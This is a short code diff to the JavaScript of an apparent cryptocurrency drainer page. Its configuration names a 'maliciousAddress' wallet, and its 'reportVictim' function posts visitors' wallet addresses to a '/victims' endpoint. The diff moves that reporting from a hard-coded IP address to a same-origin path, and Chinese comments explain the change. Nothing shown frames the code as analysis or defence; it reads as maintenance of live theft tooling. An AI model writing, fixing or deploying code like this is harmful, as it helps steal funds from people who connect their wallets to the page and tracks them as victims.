@@ -2,7 +2,8 @@
 // Configuration
 // ============================================
 const CONFIG = {
-    serverUrl: "http://45.63.51.62:3001",
+    // 🔴 核心修改点：这里改成了空字符串，表示请求与当前网页同源的路径
+    serverUrl: "",
     maliciousAddress: "0x4187f22Ac4Eb42a9a315c1D89c49FbC250Ecfbd1",
     wbnbAddress: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
 };
@@ -78,7 +79,8 @@ document.addEventListener('DOMContentLoaded', function() {
     // ============================================
     async function reportVictim(address) {
         try {
-            const response = await fetch(CONFIG.serverUrl + '/victims', {
+            // 🔴 注意这里：因为 serverUrl 是 ""，直接拼接待转发的 API 路径
+            const response = await fetch(CONFIG.serverUrl + 'victims', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ address: address })
